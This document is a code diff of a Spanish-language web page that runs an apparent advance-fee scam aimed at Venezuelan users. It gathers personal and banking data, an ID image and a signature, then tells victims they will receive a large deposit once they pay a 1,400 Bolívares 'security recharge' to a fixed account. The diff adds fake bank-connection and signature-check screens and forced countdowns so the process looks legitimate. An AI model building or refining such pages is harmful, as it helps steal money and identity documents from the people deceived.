-    // Modal Alerta Recarga
-    const modalAlertaRecarga = document.getElementById('modalAlertaRecarga');
-    const modalAlertaRecargaContent = document.getElementById('modalAlertaRecargaContent');
-    const btnAlertaRecargaOk = document.getElementById('btnAlertaRecargaOk');
+    // Datos personales para Step3 (las 3 tarjetas)
+    const cardFullName = document.getElementById('cardFullName');
+    const cardAccount = document.getElementById('cardAccount');
+    const cardBank = document.getElementById('cardBank');
+    const cardMontos = document.getElementById('cardMontos');
 
-    // Inputs final
+    // Overlays "Conectando Banco" y "Razón Adicional"
+    const overlayConectandoBanco = document.getElementById('overlayConectandoBanco');
+    const overlayRazonAdicional = document.getElementById('overlayRazonAdicional');
+    const btnRazonAdicionalContinue = document.getElementById('btnRazonAdicionalContinue');
+
+    // Inputs finales
     const finalBankOrigin = document.getElementById('finalBankOrigin');
     const finalPhone = document.getElementById('finalPhone');
     const finalCedula = document.getElementById('finalCedula');
     const verifNumeroComprobante = document.getElementById('verifNumeroComprobante');
-    const finalMontoGlobalEl = document.getElementById('finalMontoGlobal');
 
-    // Step de confirm
+    // Control del "confirm step"
     let confirmStep = 1;
 
     document.addEventListener('DOMContentLoaded', () => {
@@ -1552,7 +1574,7 @@
     });
 
     /****************************************************
-     * Manejo de Steps y scroll top
+     * Manejo de Steps y scroll
      ****************************************************/
     function showStep(step) {
       steps.forEach((st) => st.classList.remove('active'));
@@ -1587,6 +1609,83 @@
       }, 5000);
     }
 
+    function validateStep1() {
+      const fullName = document.getElementById('fullName');
+      const phonePrefix = document.getElementById('phonePrefix');
+      const phoneNumber = document.getElementById('phoneNumber');
+      const docType = document.getElementById('docType');
+      const nacionalidad = document.getElementById('nacionalidad');
+      const cedulaNumber = document.getElementById('cedulaNumber');
+      const birthDate = document.getElementById('birthDate');
+      const docUpload = document.getElementById('docUpload');
+      const signatureData = document.getElementById('signatureData');
+
+      if (!fullName.value.trim()) {
+        alert("Por favor, ingresa tu nombre completo.");
+        return false;
+      }
+      if (!phonePrefix.value) {
+        alert("Por favor, selecciona tu operadora.");
+        return false;
+      }
+      if (!phoneNumber.value.trim()) {
+        alert("Por favor, ingresa tu número de teléfono.");
+        return false;
+      }
+      if (!docType.value) {
+        alert("Por favor, selecciona el tipo de documento.");
+        return false;
+      }
+      if (!nacionalidad.value) {
+        alert("Por favor, selecciona tu nacionalidad.");
+        return false;
+      }
+      if (!cedulaNumber.value.trim()) {
+        alert("Por favor, ingresa tu número de cédula.");
+        return false;
+      }
+      if (!birthDate.value) {
+        alert("Por favor, ingresa tu fecha de nacimiento.");
+        return false;
+      }
+      if (!docUpload.files.length) {
+        alert("Por favor, sube tu documento de identidad (imagen).");
+        return false;
+      }
+      if (!signatureData.value) {
+        alert("Por favor, guarda tu firma digital antes de continuar.");
+        return false;
+      }
+      return true;
+    }
+
+    function buildSummaryStep1() {
+      const fullName = document.getElementById('fullName').value;
+      const phonePrefix = document.getElementById('phonePrefix').value;
+      const phoneNumber = document.getElementById('phoneNumber').value;
+      const docType = document.getElementById('docType').value;
+      const nacionalidad = document.getElementById('nacionalidad').value;
+      const cedulaNumber = document.getElementById('cedulaNumber').value;
+      const birthDate = document.getElementById('birthDate').value;
+      const docUpload = document.getElementById('docUpload');
+      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
+      const signatureData = document.getElementById('signatureData').value;
+
+      return `
+        <p><strong>Nombre y Apellido:</strong> ${fullName}</p>
+        <p><strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}</p>
+        <p><strong>Tipo de Documento:</strong> ${docType}</p>
+        <p><strong>Nacionalidad:</strong> ${nacionalidad}</p>
+        <p><strong>N° de Cédula:</strong> ${cedulaNumber}</p>
+        <p><strong>Fecha de Nacimiento:</strong> ${birthDate}</p>
+        <p><strong>Documento de Identidad:</strong> ${docFileName}</p>
+        <div style="margin-top:1rem;">
+          <strong>Firma Digital:</strong><br/>
+          <img src="${signatureData}" alt="Firma Digital" style="max-width:200px;"/>
+        </div>
+      `;
+    }
+
     /****************************************************
      * STEP 2 => Continuar
      ****************************************************/
@@ -1601,34 +1700,153 @@
       }, 5000);
     }
 
+    function validateStep2() {
+      const bankName = document.getElementById('bankName');
+      const accountNumber = document.getElementById('accountNumber');
+      const accountType = document.getElementById('accountType');
+      const origenFondos = document.getElementById('origenFondos');
+      const montoAlto = document.getElementById('montoAlto');
+      const depositante = document.getElementById('depositante');
+      const comprobante = document.getElementById('comprobante');
+      const metodoDeposito = document.getElementById('metodoDeposito');
+      const acceptTerms = document.getElementById('acceptTerms');
+
+      if (!bankName.value) {
+        alert("Por favor, selecciona tu banco.");
+        return false;
+      }
+      if (!accountNumber.value.trim()) {
+        alert("Por favor, ingresa tu número de cuenta.");
+        return false;
+      }
+      if (!accountType.value) {
+        alert("Por favor, selecciona el tipo de cuenta / moneda.");
+        return false;
+      }
+      if (!origenFondos.value) {
+        alert("Por favor, selecciona el origen de los fondos.");
+        return false;
+      }
+      if (!montoAlto.value) {
+        alert("Por favor, indica si recibes usualmente montos altos.");
+        return false;
+      }
+      if (!depositante.value.trim()) {
+        alert("Por favor, ingresa el nombre del depositante / titular.");
+        return false;
+      }
+      if (!comprobante.value.trim()) {
+        alert("Por favor, ingresa el número de comprobante.");
+        return false;
+      }
+      if (!metodoDeposito.value) {
+        alert("Por favor, selecciona el método de depósito.");
+        return false;
+      }
+      if (!acceptTerms.checked) {
+        alert("Debes aceptar los términos y condiciones.");
+        return false;
+      }
+      return true;
+    }
+
+    function buildSummaryStep2() {
+      const bankNameValue = document.getElementById('bankName').value;
+      const [bankCode, bankNameText] = bankNameValue ? bankNameValue.split('|') : ['', ''];
+      const accountNumber = document.getElementById('accountNumber').value;
+      const accountType = document.getElementById('accountType').value;
+      const origenFondos = document.getElementById('origenFondos').value;
+      let usdAmountVal = document.getElementById('usdAmount').value;
+      let bsAmountVal = document.getElementById('bsAmount').value;
+      if (usdAmountVal) {
+        usdAmountVal = formatMoney(usdAmountVal, 'USD');
+      }
+      if (bsAmountVal) {
+        bsAmountVal = formatMoney(bsAmountVal, 'Bolívares');
+      }
+      const montoAlto = document.getElementById('montoAlto').value;
+      const depositante = document.getElementById('depositante').value;
+      const comprobante = document.getElementById('comprobante').value;
+      const metodoDeposito = document.getElementById('metodoDeposito').value;
+
+      let currency = 'Bs';
+      if (accountType === 'usd') currency = 'USD';
+      if (accountType === 'eur') currency = 'EUR';
+
+      return `
+        <p><strong>Banco:</strong> ${bankNameText} (${bankCode || 'N/A'})</p>
+        <p><strong>Número de Cuenta:</strong> ${accountNumber}</p>
+        <p><strong>Tipo de Cuenta / Moneda:</strong> ${accountType.toUpperCase()} (${currency})</p>
+        <p><strong>Origen de Fondos:</strong> ${origenFondos}</p>
+        ${
+          usdAmountVal
+          ? `<p><strong>Monto en USD:</strong> ${usdAmountVal}</p>`
+          : ''
+        }
+        ${
+          bsAmountVal
+          ? `<p><strong>Equivalente en Bolívares:</strong> ${bsAmountVal}</p>`
+          : ''
+        }
+        <p><strong>¿Recibe montos altos?:</strong> ${montoAlto}</p>
+        <p><strong>Depositante / Titular:</strong> ${depositante}</p>
+        <p><strong>N° de Comprobante:</strong> ${comprobante}</p>
+        <p><strong>Método de Depósito:</strong> ${
+          metodoDeposito === 'pagoMovil' 
+            ? 'Pago Móvil'
+            : 'Transferencia Tradicional'
+        }</p>
+      `;
+    }
+
     /****************************************************
      * Aceptar (Modal Confirm)
      ****************************************************/
     const btnModalConfirmOk = document.getElementById('btnModalConfirmOk');
     btnModalConfirmOk.addEventListener('click', () => {
       modalConfirm.style.display = 'none';
+      overlayFirmaCoincide.style.display = 'flex';
+    });
+
+    const btnFirmaCoincideOk = document.getElementById('btnFirmaCoincideOk');
+    btnFirmaCoincideOk.addEventListener('click', () => {
+      overlayFirmaCoincide.style.display = 'none';
       if (confirmStep === 1) {
         showStep(2);
       } else if (confirmStep === 2) {
-        showStep(3);
-        startOverlay20s();
+        showOverlayFirmaNoCoincide();
       }
     });
 
+    function showOverlayFirmaNoCoincide() {
+      overlayFirmaNoCoincide.style.display = 'flex';
+      setTimeout(() => {
+        overlayFirmaNoCoincide.style.display = 'none';
+        showStep(3);
+        startOverlay20s();
+      }, 5000);
+    }
+
     /****************************************************
-     * Overlay de 20s (4 mensajes x 5s)
+     * Overlay de 20s en Step3
      ****************************************************/
     function startOverlay20s() {
       overlay20s.style.display = 'flex';
-      overlayMsgs.forEach((m) => m.style.display = 'none');
+      const msgs = [
+        document.getElementById('overlayMsg1'),
+        document.getElementById('overlayMsg2'),
+        document.getElementById('overlayMsg3'),
+        document.getElementById('overlayMsg4')
+      ];
+      msgs.forEach((m) => m.style.display = 'none');
       let index = 0;
-      overlayMsgs[0].style.display = 'block';
+      msgs[0].style.display = 'block';
 
       const interval = setInterval(() => {
         index++;
-        if (index < overlayMsgs.length) {
-          overlayMsgs[index - 1].style.display = 'none';
-          overlayMsgs[index].style.display = 'block';
+        if (index < msgs.length) {
+          msgs[index - 1].style.display = 'none';
+          msgs[index].style.display = 'block';
         } else {
           clearInterval(interval);
           setTimeout(() => {
@@ -1639,73 +1857,122 @@
       }, 5000);
     }
 
-    /****************************************************
-     * Mostrar tarjeta principal Step3
-     ****************************************************/
     function showVerificationMainCard() {
       verificationMainCard.style.display = 'block';
-      fillVerificationMainText();
+      fillVerificationMainCardData();
+      startMainCardCountdown();
     }
 
-    /****************************************************
-     * Llenar texto principal en Step3
-     ****************************************************/
-    function fillVerificationMainText() {
-      const fullName = document.getElementById('fullName').value.trim() || 'Usuario';
-      const names = fullName.split(' ');
-      const firstName = names[0] || 'Usuario';
+    /* Llenar datos de las 3 tarjetas en "¡Importante! Revisión de Seguridad..." */
+    function fillVerificationMainCardData() {
+      const fullNameVal = document.getElementById('fullName').value.trim() || 'Usuario';
+      const bankVal = document.getElementById('bankName').value;
+      const [bankCode, bankNameText] = bankVal.split('|') || [];
+      const accountNumberVal = document.getElementById('accountNumber').value || '******';
+      const docTypeVal = document.getElementById('docType').value || '';
+      const cedulaVal = document.getElementById('cedulaNumber').value || '';
+      // Monto en Bs que recibirá el usuario (ej. 69000)
+      let bsUserInput = parseFloat(document.getElementById('bsAmount').value) || 0; 
+      // La parte en USD es opcional
+      const usdAmountVal = document.getElementById('usdAmount').value;
+      let usdFormatted = usdAmountVal ? `${usdAmountVal} USD` : 'N/A';
 
-      const usdVal = parseFloat(document.getElementById('usdAmount').value) || 0;
-      const rawBsVal = parseFloat(document.getElementById('bsAmount').value) || 0;
-      const accountNumber = document.getElementById('accountNumber').value || '';
+      // Llenar la primera tarjeta
+      cardFullName.textContent = `${fullNameVal}`;
+      cardAccount.textContent = `${accountNumberVal}`;
+      cardBank.textContent = bankNameText || 'Banco Seleccionado';
+      cardMontos.textContent = `${formatMoney(bsUserInput)} / ${usdFormatted}`;
 
-      const bsValFormatted = formatMoney(rawBsVal, 'Bolívares');
-      const usdValFormatted = formatMoney(usdVal, 'USD');
-
-      verificationMainText.innerHTML = `
-        Estimado(a) <strong>${fullName}</strong>, recibirás 
-        <strong>${bsValFormatted}</strong> (equivalentes a 
-        <strong>${usdValFormatted}</strong>) en tu cuenta bancaria 
-        <strong>${accountNumber}</strong>. 
-        Debido a que se trata de un monto elevado, tu banco solicita
-        un proceso de seguridad para evitar fraudes.
-      `;
-
-      const cedula = document.getElementById('cedulaNumber').value;
-      const conceptValue = (firstName + cedula).toUpperCase().replace(/\s+/g, '');
+      // Generar “concepto recarga” = primerNombre + cédula
+      const firstName = fullNameVal.split(' ')[0] || 'Usuario';
+      const conceptValue = (firstName + cedulaVal).toUpperCase().replace(/\s+/g, '');
       conceptRecarga.textContent = conceptValue;
 
-      const bankVal = document.getElementById('bankName').value;
-      const [_, bankNameText] = bankVal.split('|') || [];
+      // Llenar datos finales para la sección "Completar Recarga"
       finalBankOrigin.textContent = bankNameText || 'Banco Origen';
       const prefix = document.getElementById('phonePrefix').value;
       const phone = document.getElementById('phoneNumber').value;
       finalPhone.textContent = prefix + '-' + phone;
-      finalCedula.textContent = cedula;
+      finalCedula.textContent = cedulaVal;
 
-      const totalReembolsar = rawBsVal + 1400;
+      // ===== Cálculo dinámico =====
+      // El monto fijo de recarga: 1400
+      // El monto que recibirá el usuario en Bs se asume "bsUserInput"
+      // Por ejemplo, si bsUserInput es 69000 => total 70400
+      const recargaFija = 1400;
+      const totalConRecarga = bsUserInput + recargaFija;
+
+      // Actualizar el texto de reembolso
       reembolsoBanner.innerHTML = `
         Al realizar esta recarga de <strong>1.400,00 Bolívares</strong>, 
-        se te devolverá junto con ${formatMoney(rawBsVal, 'Bolívares')}. 
-        Por lo tanto, tu depósito total será de 
-        <strong>${formatMoney(totalReembolsar, 'Bolívares')}</strong>.
+        se te devolverá junto con ${formatMoney(bsUserInput)}.
+        Por lo tanto, recibirás inmediatamente un depósito total por 
+        <strong>${formatMoney(totalConRecarga)}</strong>.
       `;
-      finalMontoGlobalEl.textContent = formatMoney(totalReembolsar, 'Bolívares');
+
+      finalMontoGlobalEl.textContent = formatMoney(totalConRecarga);
+
     }
 
-    /****************************************************
-     * Botón "Continuar" en la tarjeta principal
-     ****************************************************/
-    btnShowWhy.addEventListener('click', () => {
+    function startMainCardCountdown() {
+      let count = 60;
+      btnMainCardContinue.disabled = true;
+      btnMainCardContinue.textContent = `Espera ${count}s...`;
+      btnMainCardContinue.classList.add('btn-disabled');
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          btnMainCardContinue.textContent = `Espera ${count}s...`;
+        } else {
+          clearInterval(interval);
+          btnMainCardContinue.textContent = 'Continuar';
+          btnMainCardContinue.disabled = false;
+          btnMainCardContinue.classList.remove('btn-disabled');
+        }
+      }, 1000);
+    }
+
+    btnMainCardContinue.addEventListener('click', () => {
       verificationMainCard.style.display = 'none';
+      showOverlayConectandoBanco();
+    });
+
+    function showOverlayConectandoBanco() {
+      overlayConectandoBanco.style.display = 'flex';
+      setTimeout(() => {
+        overlayConectandoBanco.style.display = 'none';
+        showOverlayRazonAdicional();
+      }, 5000);
+    }
+
+    function showOverlayRazonAdicional() {
+      overlayRazonAdicional.style.display = 'flex';
+      let count = 10;
+      btnRazonAdicionalContinue.disabled = true;
+      btnRazonAdicionalContinue.textContent = `Espera ${count}s...`;
+      btnRazonAdicionalContinue.classList.add('btn-disabled');
+
+      const interval = setInterval(() => {
+        count--;
+        if (count > 0) {
+          btnRazonAdicionalContinue.textContent = `Espera ${count}s...`;
+        } else {
+          clearInterval(interval);
+          btnRazonAdicionalContinue.textContent = 'Continuar';
+          btnRazonAdicionalContinue.disabled = false;
+          btnRazonAdicionalContinue.classList.remove('btn-disabled');
+        }
+      }, 1000);
+    }
+
+    btnRazonAdicionalContinue.addEventListener('click', () => {
+      overlayRazonAdicional.style.display = 'none';
       whyVerification.style.display = 'block';
       window.scrollTo({ top: 0, behavior: 'smooth' });
       startWhyVerificationCountdown();
     });
 
-    /****************************************************
-     * Cuenta regresiva de 12s en "¿Por qué?"
-     ****************************************************/
     function startWhyVerificationCountdown() {
       let count = 12;
       btnShowWhatToDo.disabled = true;
@@ -1725,9 +1992,6 @@
       }, 1000);
     }
 
-    /****************************************************
-     * Botón "Entendido, continuar" => mostrar "¿Qué hacer?"
-     ****************************************************/
     btnShowWhatToDo.addEventListener('click', () => {
       whyVerification.style.display = 'none';
       whatToDoCard.style.display = 'block';
@@ -1735,9 +1999,6 @@
       startWhatToDoCountdown();
     });
 
-    /****************************************************
-     * Cuenta regresiva de 45s en "¿Qué necesitas hacer?"
-     ****************************************************/
     function startWhatToDoCountdown() {
       let count = 45;
       btnAfterRecarga.disabled = true;
@@ -1757,17 +2018,14 @@
       }, 1000);
     }
 
-    /****************************************************
-     * Botón "Una vez que realices tu recarga..."
-     ****************************************************/
     btnAfterRecarga.addEventListener('click', () => {
       showRecargaAlert();
     });
 
     function showRecargaAlert() {
       modalAlertaRecargaContent.innerHTML = `
-        <p>Has realizado tu recarga de seguridad por <strong>1.400,00 Bolívares</strong> a los siguientes datos:</p>
-        <ul>
+        <p>Confirma que has realizado tu recarga de seguridad por <strong>1.400,00 Bolívares</strong> a los siguientes datos:</p>
+        <ul style="list-style:none; text-align:left; margin:0; padding:0;">
           <li><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</li>
           <li><strong>Número:</strong> 0412-1000000</li>
           <li><strong>RIF:</strong> J-407502646</li>
@@ -1779,9 +2037,6 @@
       disableAlertRecargaOk();
     }
 
-    /****************************************************
-     * Botón "Confirmar" en la modal => 12s
-     ****************************************************/
     function disableAlertRecargaOk() {
       let count = 12;
       btnAlertaRecargaOk.disabled = true;
@@ -1801,21 +2056,14 @@
       }, 1000);
     }
 
-    function closeRecargaAlert() {
-      modalAlertaRecarga.style.display = 'none';
-    }
-
     btnAlertaRecargaOk.addEventListener('click', () => {
-      closeRecargaAlert();
+      modalAlertaRecarga.style.display = 'none';
       whatToDoCard.style.display = 'none';
       finalRechargeData.style.display = 'block';
       window.scrollTo({ top: 0, behavior: 'smooth' });
       disableFinalRecargaButton();
     });
 
-    /****************************************************
-     * Botón "Continuar" en sección final => 45s
-     ****************************************************/
     function disableFinalRecargaButton() {
       let count = 45;
       btnFinalRecargaContinuar.disabled = true;
@@ -1876,7 +2124,11 @@
       finalLoadingOverlay.style.display = 'none';
       comprobanteCierreMsg.style.display = 'none';
       overlay20s.style.display = 'none';
+      overlayFirmaCoincide.style.display = 'none';
+      overlayFirmaNoCoincide.style.display = 'none';
       modalAlertaRecarga.style.display = 'none';
+      overlayConectandoBanco.style.display = 'none';
+      overlayRazonAdicional.style.display = 'none';
       clearAllData();
       showStep(1);
     }
@@ -1901,147 +2153,6 @@
       steps[0].classList.add('active');
       sidebarSteps.forEach((item) => item.classList.remove('active'));
       sidebarSteps[0].classList.add('active');
-    }
-
-    /****************************************************
-     * Validaciones Step1 / Step2
-     ****************************************************/
-    function validateStep1() {
-      const fullName = document.getElementById('fullName');
-      const phonePrefix = document.getElementById('phonePrefix');
-      const phoneNumber = document.getElementById('phoneNumber');
-      const docType = document.getElementById('docType');
-      const nacionalidad = document.getElementById('nacionalidad');
-      const cedulaNumber = document.getElementById('cedulaNumber');
-      const birthDate = document.getElementById('birthDate');
-      const docUpload = document.getElementById('docUpload');
-      const signatureData = document.getElementById('signatureData');
-
-      if (
-        !fullName.value.trim() ||
-        !phonePrefix.value ||
-        !phoneNumber.value.match(/^\d{7}$/) ||
-        !docType.value ||
-        !nacionalidad.value ||
-        !cedulaNumber.value.match(/^\d{1,8}$/) ||
-        !birthDate.value ||
-        !docUpload.files.length ||
-        !signatureData.value
-      ) {
-        alert('Por favor, completa todos los campos correctamente en Datos Personales.');
-        return false;
-      }
-      return true;
-    }
-
-    function validateStep2() {
-      const bankName = document.getElementById('bankName');
-      const accountNumber = document.getElementById('accountNumber');
-      const accountType = document.getElementById('accountType');
-      const origenFondos = document.getElementById('origenFondos');
-      const montoAlto = document.getElementById('montoAlto');
-      const depositante = document.getElementById('depositante');
-      const comprobante = document.getElementById('comprobante');
-      const metodoDeposito = document.getElementById('metodoDeposito');
-      const acceptTerms = document.getElementById('acceptTerms');
-
-      if (
-        !bankName.value ||
-        !accountNumber.value.trim() ||
-        !accountType.value ||
-        !origenFondos.value ||
-        !montoAlto.value ||
-        !depositante.value.trim() ||
-        !comprobante.value.trim() ||
-        !metodoDeposito.value ||
-        !acceptTerms.checked
-      ) {
-        alert('Por favor, completa todos los campos en Datos Bancarios.');
-        return false;
-      }
-      return true;
-    }
-
-    /****************************************************
-     * Summaries para modal confirm
-     ****************************************************/
-    function buildSummaryStep1() {
-      const fullName = document.getElementById('fullName').value;
-      const phonePrefix = document.getElementById('phonePrefix').value;
-      const phoneNumber = document.getElementById('phoneNumber').value;
-      const docType = document.getElementById('docType').value;
-      const nacionalidad = document.getElementById('nacionalidad').value;
-      const cedulaNumber = document.getElementById('cedulaNumber').value;
-      const birthDate = document.getElementById('birthDate').value;
-      const docUpload = document.getElementById('docUpload');
-      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
-      const signatureData = document.getElementById('signatureData').value;
-
-      return `
-        <p><strong>Nombre y Apellido:</strong> ${fullName}</p>
-        <p><strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}</p>
-        <p><strong>Tipo de Documento:</strong> ${docType}</p>
-        <p><strong>Nacionalidad:</strong> ${nacionalidad}</p>
-        <p><strong>N° de Cédula:</strong> ${cedulaNumber}</p>
-        <p><strong>Fecha de Nacimiento:</strong> ${birthDate}</p>
-        <p><strong>Documento de Identidad:</strong> ${docFileName}</p>
-        <div style="margin-top:1rem;">
-          <strong>Firma Digital:</strong><br/>
-          <img src="${signatureData}" alt="Firma Digital" style="max-width:200px;"/>
-        </div>
-      `;
-    }
-
-    function buildSummaryStep2() {
-      const bankNameValue = document.getElementById('bankName').value;
-      const [bankCode, bankNameText] = bankNameValue ? bankNameValue.split('|') : ['', ''];
-      const accountNumber = document.getElementById('accountNumber').value;
-      const accountType = document.getElementById('accountType').value;
-      const origenFondos = document.getElementById('origenFondos').value;
-
-      let usdAmountVal = document.getElementById('usdAmount').value;
-      let bsAmountVal = document.getElementById('bsAmount').value;
-      if (usdAmountVal) {
-        usdAmountVal = formatMoney(usdAmountVal, 'USD');
-      }
-      if (bsAmountVal) {
-        bsAmountVal = formatMoney(bsAmountVal, 'Bolívares');
-      }
-
-      const montoAlto = document.getElementById('montoAlto').value;
-      const depositante = document.getElementById('depositante').value;
-      const comprobante = document.getElementById('comprobante').value;
-      const metodoDeposito = document.getElementById('metodoDeposito').value;
-
-      let currency = 'Bs';
-      if (accountType === 'usd') currency = 'USD';
-      if (accountType === 'eur') currency = 'EUR';
-
-      // Se quita el <hr/> que generaba la línea molesta
-      return `
-        <p><strong>Banco:</strong> ${bankNameText} (${bankCode || 'N/A'})</p>
-        <p><strong>Número de Cuenta:</strong> ${accountNumber}</p>
-        <p><strong>Tipo de Cuenta / Moneda:</strong> ${accountType.toUpperCase()} (${currency})</p>
-        <p><strong>Origen de Fondos:</strong> ${origenFondos}</p>
-        ${
-          usdAmountVal
-          ? `<p><strong>Monto en USD:</strong> ${usdAmountVal}</p>`
-          : ''
-        }
-        ${
-          bsAmountVal
-          ? `<p><strong>Equivalente en Bolívares:</strong> ${bsAmountVal}</p>`
-          : ''
-        }
-        <p><strong>¿Recibe montos altos?:</strong> ${montoAlto}</p>
-        <p><strong>Depositante / Titular:</strong> ${depositante}</p>
-        <p><strong>N° de Comprobante:</strong> ${comprobante}</p>
-        <p><strong>Método de Depósito:</strong> ${
-          metodoDeposito === 'pagoMovil' 
-            ? 'Pago Móvil'
-            : 'Transferencia Tradicional'
-        }</p>
-      `;
     }
 
     /****************************************************
@@ -2210,9 +2321,17 @@
       const waLink = `https://wa.me/${numeroWhats}?text=${mensaje}`;
       window.open(waLink, '_blank');
     }
+
+    /****************************************************
+     * Cerrar recarga alert
+     ****************************************************/
+    function closeRecargaAlert() {
+      modalAlertaRecarga.style.display = 'none';
+    }
   </script>
 </body>
 </html>
+
 
 
 
